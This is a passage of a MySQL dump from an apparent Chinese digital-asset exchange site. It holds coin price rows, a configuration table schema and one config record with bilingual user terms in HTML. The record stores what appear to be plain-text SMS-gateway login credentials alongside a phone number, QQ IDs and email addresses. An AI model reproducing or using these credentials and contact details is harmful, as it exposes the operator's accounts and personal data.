INSERT INTO `movesay_coin_json` VALUES ('1796', 'sgc', '[1678223.9,0,null,null]', '', '0', '1510934399', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1797', 'sgc', '[1678223.9,0,null,null]', '', '0', '1511020799', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1798', 'sgc', '[1678223.9,0,null,null]', '', '0', '1511107199', '0', '0');

-- ----------------------------
-- Table structure for movesay_config
-- ----------------------------
DROP TABLE IF EXISTS `movesay_config`;
CREATE TABLE `movesay_config` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `footer_logo` varchar(200) NOT NULL COMMENT ' ',
  `footer_logo_en` varchar(200) DEFAULT NULL,
  `huafei_zidong` varchar(200) NOT NULL COMMENT '名称',
  `kefu` varchar(200) NOT NULL,
  `huafei_openid` varchar(200) NOT NULL COMMENT '名称',
  `huafei_appkey` varchar(200) NOT NULL COMMENT '名称',
  `index_lejimum` varchar(200) NOT NULL COMMENT '设置',
  `login_verify` varchar(200) NOT NULL COMMENT '设置',
  `fee_meitian` varchar(200) NOT NULL COMMENT '设置',
  `top_name` varchar(200) NOT NULL COMMENT '设置',
  `web_name` varchar(200) NOT NULL,
  `web_title` varchar(200) NOT NULL,
  `web_logo` varchar(200) NOT NULL,
  `web_logo_en` varchar(200) DEFAULT NULL,
  `web_llogo_small` varchar(200) NOT NULL,
  `web_llogo_small_en` varchar(200) DEFAULT NULL,
  `web_keywords` text NOT NULL,
  `web_description` text NOT NULL,
  `web_close` text NOT NULL,
  `web_close_cause` text NOT NULL,
  `web_icp` text NOT NULL,
  `web_cnzz` text NOT NULL,
  `web_ren` text NOT NULL,
  `web_reg` text NOT NULL,
  `web_reg_en` text,
  `market_mr` text NOT NULL,
  `xnb_mr` text NOT NULL,
  `rmb_mr` text NOT NULL,
  `web_waring` text NOT NULL,
  `moble_type` text NOT NULL,
  `moble_url` text NOT NULL,
  `moble_user` text NOT NULL,
  `moble_pwd` text NOT NULL,
  `contact_moble` text NOT NULL,
  `contact_weibo` text NOT NULL,
  `contact_tqq` text NOT NULL,
  `contact_qq` text NOT NULL,
  `contact_qqun` text NOT NULL,
  `contact_weixin` text NOT NULL,
  `contact_weixin_img` text NOT NULL,
  `contact_email` text NOT NULL,
  `contact_alipay` text NOT NULL,
  `contact_alipay_img` text NOT NULL,
  `contact_bank` text NOT NULL,
  `user_truename` text NOT NULL,
  `user_moble` text NOT NULL,
  `user_alipay` text NOT NULL,
  `user_bank` text NOT NULL,
  `user_text_truename` text NOT NULL,
  `user_text_moble` text NOT NULL,
  `user_text_alipay` text NOT NULL,
  `user_text_bank` text NOT NULL,
  `user_text_log` text NOT NULL,
  `user_text_password` text NOT NULL,
  `user_text_paypassword` text NOT NULL,
  `mytx_min` text NOT NULL,
  `mytx_max` text NOT NULL,
  `mytx_bei` text NOT NULL,
  `mytx_coin` text NOT NULL,
  `mytx_fee` text NOT NULL,
  `trade_min` text NOT NULL,
  `trade_max` text NOT NULL,
  `trade_limit` text NOT NULL,
  `trade_text_log` text NOT NULL,
  `issue_ci` text NOT NULL,
  `issue_jian` text NOT NULL,
  `issue_min` text NOT NULL,
  `issue_max` text NOT NULL,
  `money_min` text NOT NULL,
  `money_max` text NOT NULL,
  `money_bei` text NOT NULL,
  `money_text_index` text NOT NULL,
  `money_text_log` text NOT NULL,
  `money_text_type` text NOT NULL,
  `invit_type` text NOT NULL,
  `invit_fee1` text NOT NULL,
  `invit_fee2` text NOT NULL,
  `invit_fee3` text NOT NULL,
  `invit_text_txt` text NOT NULL,
  `invit_text_txt_en` text,
  `invit_text_log` text NOT NULL,
  `index_notice_1` text NOT NULL,
  `index_notice_11` text NOT NULL,
  `index_notice_2` text NOT NULL,
  `index_notice_22` text NOT NULL,
  `index_notice_3` text NOT NULL,
  `index_notice_33` text NOT NULL,
  `index_notice_4` text NOT NULL,
  `index_notice_44` text NOT NULL,
  `text_footer` text NOT NULL,
  `shop_text_index` text NOT NULL,
  `shop_text_log` text NOT NULL,
  `shop_text_addr` text NOT NULL,
  `shop_text_view` text NOT NULL,
  `huafei_text_index` text NOT NULL,
  `huafei_text_log` text NOT NULL,
  `addtime` int(11) unsigned NOT NULL,
  `status` int(4) NOT NULL,
  `shop_coin` varchar(200) NOT NULL COMMENT '计算方式',
  `shop_logo` varchar(200) NOT NULL COMMENT '商城LOGO',
  `shop_login` varchar(200) NOT NULL COMMENT '是否要登陆',
  `index_html` varchar(50) DEFAULT NULL,
  `trade_hangqing` varchar(50) DEFAULT NULL,
  `trade_moshi` varchar(50) DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=2 DEFAULT CHARSET=utf8 ROW_FORMAT=DYNAMIC COMMENT='系统配置表';

-- ----------------------------
-- Records of movesay_config
-- ----------------------------
INSERT INTO `movesay_config` VALUES ('1', '59b395a291606.png', '59b395ac174a9.png', '1', 'c', '', '', '1', '1', '', 'There are risk in the market,Invest with your own risk.', '欧亚国际数字交易平台', '欧亚国际数字交易平台', '59b394662eb05.png', '59b3946cde278.png', '59aec85e35aa9.png', '59aec86213526.png', 'International Digital Asset Trading Platform', '', '1', '尊敬的用户：\r\n国际数字资产交易平台维护升级，升级时间预计60分钟，请您耐心等待，谢谢您的配合与支持。\r\nDear user:            International Digital Asset Trading Platform maintenance upgrade, upgrade time is expected to 60 minutes, please wait patiently, thank you for your cooperation and support. ', '', '', '100', '<div style=\"text-align:center;\">\r\n	<div style=\"text-align:left;\">\r\n		<span style=\"color:#337FE5;\"><span style=\"color:#337FE5;\"> \r\n		<div style=\"text-align:left;\">\r\n			<span style=\"color:#337FE5;\"><span style=\"color:#337FE5;\">用户协议<br />\r\n    国际数字资产交易平台所提供的各项服务的所有权和运作权均归国际数字资产交易平台所有。国际数字资产交易平台用户注册使用协议（以下简称“本协议”） 系由国际数字资产交易平台用户与国际数字资产交易平台就国际数字资产交易平台的各项服务所订立的相关权利义务规范。用户通过访问或使用本网站， 即表示接受并同意本协议的所有条件和条款。国际数字资产交易平台作为国际数字资产交易平台的运营者依据本协议为用户提供服务。不愿接受本协议条款的， 不得访问或使用本网站。国际数字资产交易平台有权对本协议条款进行修改，修改后的协议一旦公布即有效代替原来的协议。用户可随时查阅最新协议。<br />\r\n服务内容<br />\r\n1、国际数字资产交易平台运用自己的系统，通过互联网络等方式为用户提供的交易服务。 <br />\r\n2、用户必须自行准备如下设备和承担如下开支： <br />\r\n  ①上网设备，包括并不限于电脑或者其他上网终端、调制解调器及其他上网装置。 <br />\r\n  ②上网开支，包括并不限于网络接入费、上网设备租用费、手机流量费等。 <br />\r\n3、用户提供的注册资料，用户必须同意：<br />\r\n  ①提供中华人民共和国大陆地区合法、真实、准确、详尽的个人资料。<br />\r\n  ②如有变动，及时更新用户资料。如果用户提供的注册资料不合法、不真实、不准确、不详尽的，用户需承担因此引起的相应责任及后果， 并且保留终止用户使用国际数字资产交易平台各项服务的权利。 <br />\r\n<br />\r\n服务的提供、修改及终止<br />\r\n1、用户在接受国际数字资产交易平台各项服务的同时，同意接受国际数字资产交易平台提供的各类信息服务。 用户在此授权国际数字资产交易平台可以向其电子邮件、手机、通信地址等发送商业信息。 用户有权选择不接受国际数字资产交易平台提供的各类信息服务，并进入国际数字资产交易平台相关页面进行更改。 <br />\r\n2、国际数字资产交易平台保留随时修改或中断服务而不需通知用户的权利。国际数字资产交易平台有权行使修改或中断服务的权利， 不需对用户或任何无直接关系的第三方负责。 <br />\r\n3、用户对本协议的修改有异议，或对国际数字资产交易平台的服务不满，可以行使如下权利： <br />\r\n  ①停止使用国际数字资产交易平台的网络服务。 <br />\r\n  ②通过客服等渠道告知国际数字资产交易平台停止对其服务。 结束服务后，用户使用国际数字资产交易平台网络服务的权利立即终止。 在此情况下，国际数字资产交易平台没有义务传送任何未处理的信息或未完成的服务给用户或任何无直接关系的第三方。 <br />\r\n<br />\r\n用户信息的保密<br />\r\n1、本协议所称之国际数字资产交易平台用户信息是指符合法律、法规及相关规定，并符合下述范围的信息：<br />\r\n  ①用户注册国际数字资产交易平台账户时，向国际数字资产交易平台提供的个人信息。 <br />\r\n  ②用户在使用国际数字资产交易平台服务、参加网站活动或访问网站网页时，国际数字资产交易平台自动接收并记录的用户浏览器端或手机客户端数据， 包括但不限于IP地址、网站中的资料及用户要求取用的网页记录。 <br />\r\n  ③国际数字资产交易平台从商业伙伴处合法获取的用户个人信息。 <br />\r\n  ④其它国际数字资产交易平台通过合法途径获取的用户个人信息。 <br />\r\n2、国际数字资产交易平台承诺：非经法定原因或用户事先许可，不会向任何第三方透露用户的密码、姓名、 手机号码等非公开信息。 <br />\r\n3、在下述法定情况下，用户的个人信息将会被部分或全部披露： <br />\r\n  ①经用户同意向用户本人或其他第三方披露。 <br />\r\n  ②根据法律、法规等相关规定，或行政机构要求，向行政、司法机构或其他法律规定的第三方披露。 <br />\r\n  ③其它国际数字资产交易平台根据法律、法规等相关规定进行的披露。 <br />\r\n<br />\r\n<br />\r\n用户权利<br />\r\n1、用户的用户名、密码和安全性： <br />\r\n  ①用户有权选择是否成为国际数字资产交易平台用户，用户选择成为国际数字资产交易平台注册用户时，可自行输入手机号为帐号。 用户名和帐号使用应遵守相关法律法规并符合网络道德。用户名和帐号中不能含有任何侮辱、威胁、淫秽、 谩骂等侵害他人合法权益的文字。 <br />\r\n ②用户一旦注册成功，成为国际数字资产交易平台的用户，将得到用户名和密码， 并对以此组用户名和密码登入系统后所发生的所有活动和事件负责，自行承担一切使用该用户名的言语、 行为等而直接或者间接导致的法律责任。 <br />\r\n ③用户有义务妥善保管交易平台账号、用户名和密码，用户将对用户名和密码安全负全部责任。 因用户原因导致用户名或密码泄露而造成的任何法律后果由用户本人负责，由于用户自身原因泄露这些信息导致的财产损失， 本站不负相关责任。由于本站是交易网站，登录密码、提现密码、交易密码等不得使用相同密码，否则会有安全隐患， 相关责任由用户自身承担。 <br />\r\n④用户密码遗失的，可以通过绑定的手机号码重置密码。用户若发现任何非法使用用户名或存在其他安全漏洞的情况， 应立即告知国际数字资产交易平台运营平台。 <br />\r\n⑤国际数字资产交易平台不会向任何用户索取密码，不会让用户往任何非本站交易中心里提供的帐户打款， 请大家不要相信任何非国际数字资产交易平台提供的打折、优惠等诈骗信息，往非国际数字资产交易平台提供的账户、 地址里打款或币造成的损失本站不负责任。 <br />\r\n2、用户有权根据网站相关规定，在发布信息等贡献后，取得国际数字资产交易平台给予的奖励。 <br />\r\n3、用户有权修改其个人账户中各项可修改信息，自行录入介绍性文字，自行决定是否提供非必填项的内容。4、用户有权参加国际数字资产交易平台组织提供的各项线上、线下活动。 <br />\r\n5、用户有权根据国际数字资产交易平台网站规定，享受国际数字资产交易平台提供的其它各类服务。 <br />\r\n<br />\r\n用户义务<br />\r\n1、不得利用本站危害国家安全、泄露国家秘密，不得侵犯国家社会集体的和公民的合法权益，不得利用本站制作、 复制和传播下列信息： <br />\r\n①煽动抗拒、破坏宪法和法律、行政法规实施的。 <br />\r\n②煽动颠覆国家政权，推翻社会主义制度的。 <br />\r\n③煽动分裂国家、破坏国家统一的。 <br />\r\n④煽动民族仇恨、民族歧视，破坏民族团结的。 <br />\r\n⑤捏造或者歪曲事实，散布谣言，扰乱社会秩序的。 <br />\r\n⑥宣扬封建迷信、淫秽、色情、赌博、暴力、凶杀、恐怖、教唆犯罪的。 <br />\r\n⑦公然侮辱他人或者捏造事实诽谤他人的，或者进行其他恶意攻击的。 <br />\r\n⑧损害国家机关信誉的。 <br />\r\n⑨其他违反宪法和法律行政法规的。 <br />\r\n⑩进行商业广告行为的。 <br />\r\n2、用户不得通过任何手段恶意注册国际数字资产交易平台网站帐号，包括但不限于以牟利、炒作、套现、 获奖等为目的多个账号注册。用户亦不得盗用其他用户帐号,或者利用国际数字资产交易平台以及交易平台漏洞刷取。 如用户违反上述规定，则国际数字资产交易平台有权直接采取一切必要的措施，包括但不限于删除用户发布的内容、 取消用户在网站获得的虚拟财富，暂停或查封用户帐号，取消因违规所获利益，乃至通过诉讼形式追究用户法律责任等。 <br />\r\n3、禁止用户将国际数字资产交易平台以任何形式作为从事各种非法活动的场所、平台或媒介。 未经国际数字资产交易平台运营平台的授权或许可，用户不得借用本站的名义从事任何商业活动， 也不得以任何形式将国际数字资产交易平台作为从事商业活动的场所、平台或媒介。如用户违反上述规定， 则国际数字资产交易平台运营平台有权直接采取一切必要的措施，包括但不限于删除用户发布的内容、取消用户在网站获得的虚拟财富， 暂停或查封用户帐号，取消因违规所获利益，乃至通过诉讼形式追究用户法律责任等。 <br />\r\n4、用户在国际数字资产交易平台以各种形式发布的一切信息，均应符合国家法律法规等相关规定及网站相关规定， 符合社会公序良俗，并不侵犯任何第三方主体的合法权益，否则用户自行承担因此产生的一切法律后果， 且国际数字资产交易平台因此受到的损失，有权向用户追偿。 <br />\r\n5、按照国际数字资产交易平台的要求准确提供并及时更新您正确、最新及完整的身份信息及相关资料。 若国际数字资产交易平台有合理理由怀疑您提供的身份信息即相关资料错误、不实、过失或不完整的， 国际数字资产交易平台有权要求您补充相关资料来证明您身份的真实性。若您不能及时配合提供， 国际数字资产交易平台有权暂停或终止向您提供服务。国际数字资产交易平台对此不承担任何责任， 您将承担因此产生的任何直接或间接支出。 <br />\r\n6、用户应当有独立的风险承担能力，以及具备相应的民事行为能力，注册实名认证用户应为中国大陆地区公民， 年龄限制在16周岁~70周岁。 <br />\r\n<br />\r\n拒绝担保与免责<br />\r\n1、国际数字资产交易平台作为“网络服务提供者”的第三方平台，不担保网站平台上的信息及服务能充分满足用户的需求。 对于用户在接受国际数字资产交易平台的服务过程中可能遇到的错误、侮辱、诽谤、不作为、淫秽、色情或亵渎事件， 国际数字资产交易平台不承担法律责任。 <br />\r\n2、基于互联网的特殊性，国际数字资产交易平台也不担保服务不会受中断，对服务的及时性、安全性都不作担保， 不承担非因国际数字资产交易平台导致的责任。国际数字资产交易平台力图使用户能对本网站进行安全访问和使用， 但国际数字资产交易平台不声明也不保证本网站或其服务器是不含病毒或其它潜在有害因素的。 因此用户应使用业界公认的软件查杀任何自国际数字资产交易平台下载文件中的病毒。 <br />\r\n3、国际数字资产交易平台不对用户所发布信息的保存、修改、删除或储存失败负责。 对网站上的非因国际数字资产交易平台故意所导致的排字错误、疏忽等不承担责任。国际数字资产交易平台有权但无义务， 改善或更正本网站任何部分之疏漏、错误。 <br />\r\n4、除非国际数字资产交易平台以书面形式明确约定，国际数字资产交易平台对于用户以任何方式（包括但不限于包含、经由、连接或下载 ）从本网站所获得的任何内容信息，包括但不限于广告等，不保证其准确性、完整性、可靠性； 对于用户因本网站上的内容信息而购买、获取的任何产品、服务、信息或资料，国际数字资产交易平台不承担责任。 用户自行承担使用本网站信息内容所导致的风险。 <br />\r\n5、国际数字资产交易平台内所有用户所发表的用户评论，仅代表用户个人观点， 并不表示本网站赞同其观点或证实其描述，本网站不承担用户评论引发的任何法律责任。 <br />\r\n6、国际数字资产交易平台有权删除国际数字资产交易平台内各类不符合法律或协议规定的信息，而保留不通知用户的权利。 <br />\r\n7、所有发给用户的通告，国际数字资产交易平台都将通过正式的页面公告、站内信、电子邮件、客服电话、 手机短信或常规的信件送达。任何非经国际数字资产交易平台正规渠道获得的中奖、优惠等活动或信息， 国际数字资产交易平台不承担法律责任。 <br />\r\n<br />\r\n适用法律和裁判地点<br />\r\n1、因用户使用国际数字资产交易平台而引起或与之相关的一切争议、权利主张或其它事项， 均受中华人民共和国法律的管辖。 <br />\r\n2、用户和国际数字资产交易平台发生争议的，应首先本着诚信原则通过协商加以解决。 如果协商不成，则应向国际数字资产交易平台所在地人民法院提起诉讼。 <br />\r\n<br />\r\n可分性<br />\r\n如果本协议的任何条款被视为不合法、无效或因任何原因而无法执行，则此等规定应视为可分割， 不影响任何其它条款的法律效力。 <br />\r\n<br />\r\n冲突选择<br />\r\n本协议是国际数字资产交易平台与用户注册成为国际数字资产交易平台用户，使用国际数字资产交易平台服务之间的重要法律文件， 国际数字资产交易平台或者用户的任何其他书面或者口头意思表示与本协议不一致的，均应当以本协议为准。 <br />\r\n                                                                                   国际数字资产交易平台<br />\r\n                                                                                    2016年1月1日<br />\r\n<br />\r\n</span><span style=\"color:#337FE5;\"></span></span> \r\n		</div>\r\n</span><span style=\"color:#337FE5;\"></span></span> \r\n	</div>\r\n	<div style=\"text-align:left;\">\r\n		<span style=\"color:#337FE5;\"></span> \r\n	</div>\r\n</div>\r\n<p>\r\n	<span style=\"font-size:10px;color:#E56600;\"></span> \r\n</p>', '<p align=\"left\" style=\"text-align:left;\">\r\n	<b>Service Terms<br />\r\n<br />\r\nOwnership and operation of the services International Digital Asset Trading Platform provided by this platform are the property of all. World Bull Terms of Service (hereinafter referred to as the \'Terms\') is regulated by the relevant rights and obligations of the service user and the World Bull International Digital Asset Trading Platform being made. Users by accessing and / or using the Site is accept and agree to all the terms and conditions of this Agreement. International Digital Asset Trading Platform as this platform (www.International Digital Asset Trading Platform.com) operators under this agreement provide services for users. Unwilling to accept the terms of this Agreement shall not access or use this site.<br />\r\nWorld Bull reserves the right to revise the terms of this agreement, once published the revised agreement that is effective to replace the original agreement. Users can check the latest agreement at any time.<br />\r\nFirst, the terms of service <br />\r\n1. World Bull use their own system, through the Internet and other means to provide digital asset trading services for users. <br />\r\n2. The user must prepare their own equipment and bear the following expenses as follows: (1) Internet access devices, including, but not limited to computers or other Internet terminals, modems, and other access devices; (2) Internet access costs, including, but not limited to Internet access fees, Internet equipment rental, and phone traffic fees. <br />\r\n3. Registration information provided by the user, the user agrees: (1) providing a legitimate, true, accurate and detailed personal information; (2) are subject to change, update user information. If the registration information provided by the user is not illegal, untrue, inaccurate, not exhaustive, the user must therefore assume the corresponding responsibility and the consequences arising, and reserves the right to terminate the right to use than user network services network than the right.<br />\r\nSecond, service delivery, modification and termination <br />\r\n1. The user accepts World Bull various services, agreed to accept all kinds of information and services of the platform. User hereby authorize the platform can send business information to its e-mail, phone, mailing address, etc. Users have the right to choose not to accept all kinds of information and services offered on this platform, and enter the relevant page of the platform change. <br />\r\n2. World Bull reserves the right to modify or discontinue the service without notice user\'s rights. International Digital Asset Trading Platform entitled to exercise the right to modify or discontinue service, without the user or any third party not directly related. <br />\r\n3. The user modification of this agreement have objections, or dissatisfied with the service International Digital Asset Trading Platform, can exercise the following rights:<br />\r\n   - Stop using Word Bull network services;<br />\r\n   - inform the World Bull stop its services through customer service. After the service, the rights of users of network services International Digital Asset Trading Platform terminated immediately. In this case, the platform has no obligation to send any pending or completed information services to users or any third parties not directly related.<br />\r\nThree, confidential user information <br />\r\n1. International Digital Asset Trading Platform user information in this Agreement, the term refers to compliance with laws, rules and regulations, and in accordance with the following range of information :<br />\r\n   - When the user registration application for World Bull World Bull or a member of the personal information provided to this platform;<br />\r\n   - When users use International Digital Asset Trading Platform services, to participate in the site activity or visit the Web site pages, the platform automatically receives and records the user\'s browser or mobile phone client end end data, including but not limited to, IP addresses, websites Cookie information and user requirements in access to web logs;<br />\r\n   - The user\'s personal information from business partners International Digital Asset Trading Platform legally acquired;<br />\r\n   - Other International Digital Asset Trading Platform personal information through legitimate channels acquired.<br />\r\n2, World Bull promise : <br />\r\nthrough legal reasons or user prior authorization, International Digital Asset Trading Platform not disclose non-public information about a user\'s password, name, phone number and so on to any third party. <br />\r\n3, in the following legal case, the user\'s personal information will be partially or fully disclosed :<br />\r\n   - Consent of the user himself or disclosed to third parties other users;<br />\r\n   - According to relevant laws, regulations, or administrative agency request, disclose to third parties the executive, judicial or other legal provisions;<br />\r\n   - Other International Digital Asset Trading Platform be disclosed in accordance with the relevant laws and regulations.<br />\r\nFourth, the user right <br />\r\n1. The user name, password and security<br />\r\n   - The user has the right to choose whether to become International Digital Asset Trading Platform member, if the user chooses to become a registered user of this platform, e-mail address shall be used as the name of the platform members. E-mail address used should comply with the relevant laws and regulations and in line with the network ethics.<br />\r\n   - Once users register successfully and become International Digital Asset Trading Platform member, will be the user\'s mailbox (user name) and password, and this group of users mailbox (user name) and password for all the activities and events that occur after the login to the system responsible for their own bear all use the E-mail (user name) of speech, behavior, etc., directly or indirectly lead to legal liability.<br />\r\n   - Safekeeping under an obligation International Digital Asset Trading Platform account, e-mail (user name) and password, SMS verification code, users will be E-mail (username) and password bear full responsibility. Any legal consequences due to user causes E-mail (username) or passwords leak caused by the user himself is responsible for their own reasons because the user information leak caused damage to property, the site assumes liability. Since the site was trading website, the login password, cash password, transaction password, etc. can not use the same password, or there will be a security risk, related responsibilities borne by the users themselves.<br />\r\n   - The user password is lost, you can send e-mail messages by registering to mail@International Digital Asset Trading Platform.com or contact customer service. If users find any illegal use of electronic mail (user name) or the existence of other security vulnerabilities should be immediately informed of the internet.<br />\r\n   - International Digital Asset Trading Platform not obtainable from any user passwords, user accounts will not let go of any non-trading center site provides digital asset recharge addresses play money, please do not believe that any International Digital Asset Trading Platform discounts, promotions and other fraudulent information, if the transaction is International Digital Asset Trading Platform account platform, address in play money or currency losses this platform irresponsible.<br />\r\n   - International Digital Asset Trading Platform not obtainable from any user passwords, user accounts will not let go of any non-trading center site provides digital asset recharge addresses play money, please do not believe that any International Digital Asset Trading Platform discounts, promotions and other fraudulent information, if the transaction is International Digital Asset Trading Platform account platform, address in play money or currency losses this platform irresponsible.<br />\r\n2. The user is entitled in accordance with the relevant provisions of the site, after the release of information, the contribution made International Digital Asset Trading Platform a reward; <br />\r\n3. The user has the right to modify their personal accounts can modify the information to decide whether to provide non-required content; <br />\r\n4. The user is entitled in accordance with the relevant provisions of the site, get International Digital Asset Trading Platform give rewards (such as physical rewards or loyalty points); <br />\r\n5. The user has the right to participate in the online International Digital Asset Trading Platform organizations, offline activities; <br />\r\n6. The user is entitled in accordance with the provisions of International Digital Asset Trading Platform website, enjoy other types of services. The platform provides.<br />\r\nFifth, the user obligations <br />\r\n1. Can not use this platform to endanger national security, leaking state secrets, shall not infringe upon the legitimate rights and interests of national social collective and citizens may not use this site production, reproduction and dissemination of the<br />\r\n   following information:<br />\r\n     - Once users register successfully and become International Digital Asset Trading Platform member, will be the user\'s mailbox (user name) and password, and this group of users mailbox (user name) and password for all the activities and events that occur after the login to the system responsible for their own bear all use the E-mail (user name) of speech, behavior, etc., directly or indirectly lead to legal liability.<br />\r\n   - regulations to implement;<br />\r\n     - Incitement to subvert state power and overthrow the socialist system;<br />\r\n     - Incitement to split the country and undermine national unity;<br />\r\n     - Incitement to ethnic hatred, ethnic discrimination, undermining national unity;<br />\r\n     - Fabrication or distortion of facts, spread rumors, disturbs social order;<br />\r\n     - Promoting feudal superstitions, obscenity, pornography, gambling, violence, murder, terrorism, aiding and abetting a crime;<br />\r\n     - Affront others or fabricating facts to slander others, or other malicious attacks;<br />\r\n     - Damage to reputation of state organs;<br />\r\n     - Violation of the Constitution and other laws and administrative regulations;<br />\r\n     - Commercial advertising behavior.<br />\r\n2. The user can not by any means a malicious Web site registered International Digital Asset Trading Platform account, including but not limited to, profit, hype, cash, winning multiple accounts for the purpose of registration. Users also should not be misappropriated other user accounts. <br />\r\nIf the user in violation of these provisions, the International Digital Asset Trading Platform right to take all necessary measures to direct, including, but not limited to, delete users to publish content, cancel the user in website ratings, honor and virtual wealth, suspended or closed down user accounts, canceled due to irregularities the benefits obtained, and even prosecuted user through litigation and other forms of legal liability. <br />\r\n3. Prohibits any form of user International Digital Asset Trading Platform as engaged in various illegal activities, sites, platforms or media. International Digital Asset Trading Platform without authorization or license, the user can not borrow the name of the platform to engage in any commercial activity, nor any form will International Digital Asset Trading Platform as engaged in commercial activities places, platforms or media. <br />\r\nIf the user in violation of these provisions, the International Digital Asset Trading Platform right to take all necessary measures to direct, including, but not limited to, delete users to publish content, cancel the user in website ratings, honor and virtual wealth, suspended or closed down user accounts, canceled due to irregularities the benefits obtained, and even prosecuted user through litigation and other forms of legal liability. <br />\r\n4, all the information of the user in Word Bull issued in various forms, shall comply with the relevant regulations and site-related regulations and laws, in line with the social public order and morals and does not infringe on the legal rights of any third party body, otherwise the user to bear thus creating all the legal consequences, and therefore subject to more than the right to net loss, the user has the right to recover. <br />\r\n5. Users may not fictitious facts, etc. malicious slander International Digital Asset Trading Platform goodwill.<br />\r\nSix, refused to guarantee and Disclaimer <br />\r\n1. International Digital Asset Trading Platform as a \"network service provider\" of third-party platform, do not guarantee the website information and services on the platform to fully meet the needs of users. For user error in accepting this platform service process may encounter, insult, slander, omission, obscene, pornographic or profane events, this platform is not liable. <br />\r\n2. Based on the special nature of the Internet, International Digital Asset Trading Platform nor the security services will not be interrupted, the timeliness of service, security is not guaranteed, does not assume responsibility caused by reason of the platform. <br />\r\nThe platform allows users to secure access to this website and use, but this platform does not represent nor warrant that the website or servers are free of viruses or other potentially harmful factors; therefore users should use industry-recognized software killing than any since right network to download the file for viruses. <br />\r\n3. International Digital Asset Trading Platform not release the user to save the information, modify, delete or save responsible for the failure. For typographical errors on the site due to the non-right network than deliberately caused, we are not liable for negligence. World Bull has the right but not the obligation, to improve or correct omissions in any portion of this site error. <br />\r\n4. International Digital Asset Trading Platform unless expressly agreed in writing, the platform for the user in any way (including but not limited to contain, via connection or download) any content information obtained from this website, including, but not limited to advertising, does not guarantee its accuracy, completeness, reliability; for the user because the content information on this site and purchase, acquire any products, services, information, or data, this platform is not liable. Users bear the risk of using the information content of the website caused. <br />\r\n5. All users in the network International Digital Asset Trading Platform published user comments on behalf of only the user\'s personal point of view, does not mean that this site agree with their views or confirm the description, this site does not assume any liability caused by user reviews. <br />\r\n6. International Digital Asset Trading Platform the right to delete this platform within the network of various types of information does not comply with the law or agreement, and without notifying the user rights reserved. <br />\r\n7. All notices sent to the user, this platform will page through formal announcement, the station letter, e-mail, customer service phone, SMS or regular mail delivery. Any non-regular pipeline through this platform to get the win, promotions and other activities, or information, this platform is not liable. <br />\r\n8. International Digital Asset Trading Platform right to adjust according to market conditions recharge, cash, trade and other fee rates, the right to decide to terminate free promotion period.<br />\r\nSeven, the applicable law and the referee Location <br />\r\n1. Because users use Word Bull website all disputes arising out of or, claims or other matters, are subject to the jurisdiction of the People\'s Republic of China associated with the law. <br />\r\n2. Users and International Digital Asset Trading Platform dispute should first be resolved through good faith negotiation. If the negotiation fails, it should sue the local people\'s court of the platform.<br />\r\nEight, Severability <br />\r\nIf any provision of this Agreement shall be deemed unlawful, void or for any reason unenforceable, then such provision shall be deemed severable and not affect the legal validity of any other provision.<br />\r\nNine, conflict select <br />\r\nThis Agreement is International Digital Asset Trading Platform user to register as a user of the platform, use this platform an important legal document between services, and any other written or oral means or the user of this platform represents inconsistent with this Agreement, this Agreement shall prevail.<br />\r\n <br />\r\n<br />\r\n</b> \r\n</p>\r\n<p>\r\n	<span></span> \r\n</p>', 'sgc_cny', 'sgc', 'cny', '不投入超过风险承受能力的资金，不投资不了解的数字资产，不听信任何推荐买币投资的宣传，坚决抵制传销、电信诈骗和洗钱套汇等违法行为。', '1', 'http://utf8.sms.webchinese.cn', 'qiao123456', '176a702185a7a541de09', '18024054639', 'http://weibo.com/', 'http://t.qq.com/', '342855572', '', 'li83839140', '56f98e6d70135.jpg', '83839140@qq.com', '83839140@qq.com', '56f98e6d7245d.jpg', '中国银行|动说科技|0000 0000 0000 0000', '2', '2', '2', '2', '&lt;span&gt;&lt;span&gt;会员您好,务必正确填写好自己的真实姓名和真实身份证号码.&lt;/span&gt;&lt;/span&gt;', '&lt;span&gt;会员您好,务必用自己的手机号码进行手机认证,认证以后可以用来接收验证码.&lt;/span&gt;', '&lt;span&gt;会员您好,务必正确填写支付宝 &amp;nbsp;真实姓名（与实名认证姓名相同）和支付宝账号,后期提现唯一依据.&lt;/span&gt;', '&lt;span&gt;会员您好,&lt;/span&gt;&lt;span&gt;&lt;span&gt;务必正确填写银行卡信息 提现唯一依据.&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;', '&lt;span&gt;自己以往操作和登录及登录地点的相关记录.&lt;/span&gt;', '&lt;span&gt;会员您好,修改登录密码以后请不要忘记.若不记得旧登录密码,请点击--&lt;/span&gt;&lt;span style=&quot;color:#EE33EE;&quot;&gt;忘记密码&lt;/span&gt;', '&lt;span&gt;会员您好,修改交易密码以后请不要忘记.若不记得旧交易密码,请点击--&lt;/span&gt;&lt;span style=&quot;color:#EE33EE;&quot;&gt;忘记密码&lt;/span&gt;', '1000', '5000000', '100', 'cny', '1', '1', '10000000', '10', '&lt;span&gt;&lt;span&gt;你委托买入或者卖出成功交易后的记录.&lt;/span&gt;&lt;/span&gt;', '5', '24', '1', '100000', '100', '100000', '100', '理财首页', '理财记录', '理财类型', '1', '5', '3', '2', '探索未来财富世界', '', '&lt;span&gt;&lt;span&gt;查看自己推广的好友,请点击&lt;/span&gt;&lt;span style=&quot;color:#EE33EE;&quot;&gt;“+”&lt;/span&gt;&lt;span&gt;,同时正确引导好友实名认证以及买卖,赚取推广收益和交易手续费.&lt;/span&gt;&lt;/span&gt;', '系统可靠', '银行级用户数据加密、动态身份验证多级风险识别控制，保障交易安全', '系统可靠', '账户多层加密，分布式服务器离线存储，即时隔离备份数据，确保安全', '快捷方便', '充值即时、提现迅速，每秒万单的高性能交易引擎，保证一切快捷方便', '服务专业', '热忱的客服工作人员和24小时的技术团队随时为您的账户安全保驾护航', '&lt;p&gt;\r\n	&lt;a href=&quot;/Article/index/type/aboutus.html&quot; target=&quot;_blank&quot;&gt;/Article/index/type/aboutus.html&lt;/a&gt;\r\n&lt;/p&gt;\r\n&lt;p&gt;\r\n	&lt;br /&gt;\r\n&lt;/p&gt;\r\n&lt;p&gt;\r\n	&amp;lt;a href=&quot;&lt;a href=&quot;/Article/index/type/aboutus.html&quot; 